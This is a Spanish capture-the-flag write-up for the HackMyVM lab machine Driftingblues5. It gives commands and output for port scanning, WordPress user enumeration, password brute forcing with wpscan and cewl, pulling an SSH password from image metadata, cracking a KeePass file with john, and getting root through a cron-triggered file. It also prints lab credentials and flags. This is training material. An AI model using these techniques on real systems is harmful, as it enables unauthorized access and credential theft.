---
icon: flag
---

# Driftingblues5 HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 03:15 EDT
Nmap scan report for 192.168.5.29
Host is up (0.00081s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.6.2
|_http-title: diary &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:50:73:B2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
```

Veremos que tenemos un puerto `80` en el que posiblemente este alojada una pagina web, vamos a entrar dentro de la misma a ver que nos encontramos, entrando dentro ya de primeras si bajamos abajo del todo vemos que esta creado por `wordpress` por lo que vamos a ver si encontramos algunas credenciales con la herramienta `wpscan`.

## wpscan

```shell
wpscan --url http://<IP>/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.5.29/ [192.168.5.29]
[+] Started: Mon May 26 03:16:59 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.29/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.29/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.5.29/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.29/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.5.29/index.php/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
 |  - http://192.168.5.29/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.5.29/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.5.29/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.5.29/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.5.29/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===============================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.5.29/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon May 26 03:17:05 2025
[+] Requests Done: 82
[+] Cached Requests: 11
[+] Data Sent: 19.71 KB
[+] Data Received: 22.896 MB
[+] Memory used: 204.625 MB
[+] Elapsed time: 00:00:05
```

Vemos que hemos obtenido algunos nombre de usuarios, por lo que vamos a pontarnos una lista de usuarios de esta forma:

## Credentials WordPress gill

> users.txt

```
abuzerkomurcu
gill
collins
satanic
gadd
```

Tambien vamos a generar un diccionario de palabras de la propia pagina del `wordpress` a ver que encontramos.

```shell
cewl http://<IP>/ -w pass.txt
```

Ahora vamos a tirar un ataque de fuerza bruta contra dichos usuarios y contraseñas.

```shell
wpscan --url http://<IP>/ --usernames users.txt --passwords pass.txt
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.5.29/ [192.168.5.29]
[+] Started: Mon May 26 03:21:57 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.5.29/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.5.29/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.5.29/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.5.29/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.5.29/index.php/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>
 |  - http://192.168.5.29/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.8.1</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.5.29/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://192.168.5.29/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://192.168.5.29/wp-content/themes/twentytwentyone/style.css?ver=1.1
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.5.29/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://192.168.5.29/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 5 user/s
[SUCCESS] - gill / interchangeable
^Cying gadd / pricey Time: 00:04:06 <=====================================                                              > (3777 / 8259) 45.73%  ETA: 00:04:53
[!] Valid Combinations Found:
 | Username: gill, Password: interchangeable

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                      > (3783 / 8259) 45.80%  ETA: 00:04:52
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon May 26 03:26:06 2025
[+] Requests Done: 3924
[+] Cached Requests: 43
[+] Data Sent: 1.316 MB
[+] Data Received: 20.204 MB
[+] Memory used: 320.461 MB
[+] Elapsed time: 00:04:09

Scan Aborted: Canceled by User
```

Vemos que encontro una credenciales validas despues de un rato.

```
[SUCCESS] - gill / interchangeable
```

Vamos a probarlas llendonos al panel de administrador del `wordpress` de la siguiente forma.

```
URL = http://<IP>/wp-admin
```

Una vez que nos loguemos veremos que estaremos dentro, vamos a buscar un poco la forma de acceder a dicha maquina o algo por el estilo.

## Escalate user gill

Si nos vamos a `Media` -> `Library` veremos una imagen que no aparece en la pagina de `wordpress` que seria esta de aqui.

<figure><img src="../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

Vamos a descargarnosla y ver que `metadatos` contiene ya que es bastante interesante.

```shell
wget http://<IP>/wp-content/uploads/2021/02/dblogo.png
```

Una vez que nos la hayamos descargado, haremos esto.

```shell
exiftool dblogo.png
```

Info:

```
ExifTool Version Number         : 13.10
File Name                       : dblogo.png
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2021:02:24 09:46:01-05:00
File Access Date/Time           : 2025:05:26 03:31:45-04:00
File Inode Change Date/Time     : 2025:05:26 03:31:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 300
Image Height                    : 300
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
SRGB Rendering                  : Perceptual
Gamma                           : 2.2
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39
Creator Tool                    : Adobe Photoshop CC 2018 (Windows)
Create Date                     : 2021:02:24 02:55:28+03:00
Metadata Date                   : 2021:02:24 02:55:28+03:00
Modify Date                     : 2021:02:24 02:55:28+03:00
Instance ID                     : xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
Document ID                     : adobe:docid:photoshop:7232d876-a1d0-044b-9604-08837143888b
Original Document ID            : xmp.did:5890be6c-649b-0248-af9b-19889727200c
Color Mode                      : RGB
ICC Profile Name                : sRGB IEC61966-2.1
Format                          : image/png
History Action                  : created, saved
History Instance ID             : xmp.iid:5890be6c-649b-0248-af9b-19889727200c, xmp.iid:562b80d4-fe12-8541-ae0c-6a21e7859405
History When                    : 2021:02:24 02:55:28+03:00, 2021:02:24 02:55:28+03:00
History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
History Changed                 : /
Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not
Text Layer Text                 : ssh password is 59583hello of course it is lowercase maybe not :)
Document Ancestors              : adobe:docid:photoshop:871a8adf-5521-894c-8a18-2b27c91a893b
Image Size                      : 300x300
Megapixels                      : 0.090
```

Vemos bastante informacion pero entre ella veremos lo siguiente:

```
Text Layer Name    : ssh password is 59583hello of course it is lowercase maybe not
Text Layer Text    : ssh password is 59583hello of course it is lowercase maybe not :)
```

Vemos lo que parece las credenciales del usuario `gill` por el `SSH`, vamos a probarlo.

### SSH

```shell
ssh gill@<IP>
```

Metemos como contraseña `59583hello` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
F83FC7429857283616AE62F8B64143E6
```

## Escalate Privileges

Si listamos la `home` del propio usuario `gill` veremos este archivo de aqui.

```
-rwx------ 1 gill gill 2030 Feb 24  2021 keyfile.kdbx
```

Vemos que es un archivo de `KeePass` por lo que vamos a pasarnoslo al `host` y vamos a `crakear` la contraseña en nuestro `host`.

Abriremos un servidor de `python3` en la maquina victima.

```shell
python3 -m http.server
```

En la maquina `host` nos lo descargaremos con la herramienta `wget`, una vez echo esto, haremos lo siguiente.

```shell
keepass2john keyfile.kdbx > hash.keep
```

```shell
john --wordlist=<WORDLIST> hash.keep
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
porsiempre       (keyfile)     
1g 0:00:00:21 DONE (2025-05-26 03:37) 0.04646g/s 320.4p/s 320.4c/s 320.4C/s winston1..lollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos encontrado la contraseña de dicho archivo, por lo que vamos abrirlo y ver que contiene.

```shell
keepassxc keyfile.kdbx
```

Metemos como contraseña `porsiempre` y veremos que estamos dentro, pero no veremos nada interesante dentro, si nos volvemos a la maquina victima y vemos la siguiente carpeta llamada `keyfolder` en la raiz, veremos que es la misma que la del `keepass` de la `DB`, por lo que algo tendra que ver con eso.

Vamos a probar a crear dichas carpetas en dicho archivo de la `DB` que encontramos en el `keepass`.

```shell
touch /keyfolder/fracturedocean /keyfolder/2real4surreal /keyfolder/buddyretard /keyfolder/closet313 /keyfolder/exalted
```

Veremos que no pasa nada, pero si los empezamos a crear por separado uno por uno eliminando el anterior y metiendo el nuevo, veremos que con el archivo llamado `fracturedocean` si funciona y veremos esto despues de haber esperado un poco.

```
total 12
drwx---rwx  2 root root 4096 May 26 02:56 .
drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
-rw-r--r--  1 gill gill    0 May 26 02:55 fracturedocean
-rw-r--r--  1 root root   29 May 26 02:56 rootcreds.txt
```

Veremos que se nos ha creado un archivo llamado `rootcreds.txt` que si lo leemos veremos esto:

```
root creds

imjustdrifting31
```

Vemos lo que parece ser las credenciales de `root`.

```shell
su root
```

Metemos como contraseña `imjustdrifting31` y veremos que estamos dentro.

Info:

```
root@driftingblues:/keyfolder# whoami
root
```

Vamos a leer la `flag` de `root`.

> root.txt

```
9EFF53317826250071574B4D4EE56840
```
